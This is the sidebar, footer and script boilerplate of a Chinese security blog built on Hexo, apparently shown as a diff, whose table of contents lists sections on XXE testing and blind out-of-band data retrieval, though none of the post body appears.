class="nav-number">5.4.</span> <span class="nav-text">4、其他玩法（协议）-见参考地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-XXE-%E9%BB%91%E7%9B%92-JS-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95-%E7%B1%BB%E5%9E%8B%E4%BF%AE%E6%94%B9"><span class="nav-number">6.</span> <span class="nav-text">XML&amp;XXE-黑盒-JS&amp;黑盒测试&amp;类型修改</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E9%BB%91%E7%9B%92%E5%8F%91%E7%8E%B0%EF%BC%9A-1"><span class="nav-number">6.1.</span> <span class="nav-text">XXE黑盒发现：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-XXE-%E7%99%BD%E7%9B%92-CMS-PHPSHE-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">7.</span> <span class="nav-text">XML&amp;XXE-白盒-CMS&amp;PHPSHE&amp;无回显</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">7.1.</span> <span class="nav-text">审计流程：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%84%B6%E5%90%8E%E5%B8%A6%E5%A4%96%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE%E8%A7%A3%E5%86%B3%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%9A"><span class="nav-number">7.2.</span> <span class="nav-text">然后带外传递数据解决无回显：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="z7"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">z7</p>
+  <div class="site-description" itemprop="description">师从小迪，欢迎各位来当迪总的韭菜</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">79</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z7yy" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z7yy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:15866095848@163.com" title="E-Mail → mailto:15866095848@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;" rel="noopener" target="_blank"><i class="fab fa-git fa-fw"></i>Gitee</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i>知乎</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="link fa-fw"></i>
+      链接网站
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://baidu.com/" title="https:&#x2F;&#x2F;baidu.com" rel="noopener" target="_blank">百度</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.xiaodi8.com/" title="http:&#x2F;&#x2F;www.xiaodi8.com&#x2F;" rel="noopener" target="_blank">小迪渗透吧</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023-10 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">z7</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">195k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:57</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共75.5k字</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,0' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+</body>
+</html>
